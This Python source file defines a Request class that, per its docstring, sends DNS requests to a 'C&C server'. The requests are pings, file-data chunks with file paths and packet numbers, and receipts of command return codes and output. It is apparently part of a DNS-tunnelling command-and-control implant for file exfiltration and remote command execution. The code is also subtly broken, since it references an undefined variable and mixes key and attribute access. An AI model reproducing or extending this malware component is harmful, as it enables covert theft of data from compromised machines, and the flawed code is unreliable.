# internal imports
from utils.consts import REQUEST_TYPE_ERR
from utils.request_type import RequestType
from bundler.data_request import DataRequest
from bundler.ping_request import PingRequest
from bundler.receipt_request import ReceiptRequest

class Request:
    """ A class for the DNS request that is sent to the C&C server holding information / receipt. """

    def __init__(self, request_type):
        # type = (PING, DATA, RECEIPT)
        self.type = request_type
    
    def send(self, options=None):
        """ Main function that sends a request based on its type. """
        if self.type == RequestType.PING:
            self._send_ping()
        elif self.type == RequestType.DATA: 
            self._send_data(options)
        elif self.type == RequestType.RECEIPT: 
            self._send_receipt(options)
        else: 
            raise Exception(REQUEST_TYPE_ERR)
    
    def _send_ping(self):
        """ Helper function to send a ping request. """
        ping_request = PingRequest()
        ping_request.send()
    
    def _send_data(self, options):
        """ Helper function to send a data request. """

        if set(["_type", "packet_number", "data", "file_path"]) != set(options.keys()):
            raise KeyError("Valid option(s) for data request not found: '_type', 'packet_number', 'data'")

        data_request = DataRequest(
            _type=options._type, 
            packet_number=options.packet_number, 
            file_path=options.file_path, 
            data=data
        )
        data_request.send()
    
    def _send_receipt(self, options):
        """ Helper function to send a receipt request. """

        if "retcode" not in options or 'output' not in options:
            raise KeyError("Valid option(s) for receipt request not found: 'retcode', 'output'")

        receipt_request = ReceiptRequest(retcode=options.retcode, output=options.output)
        receipt_request.send()
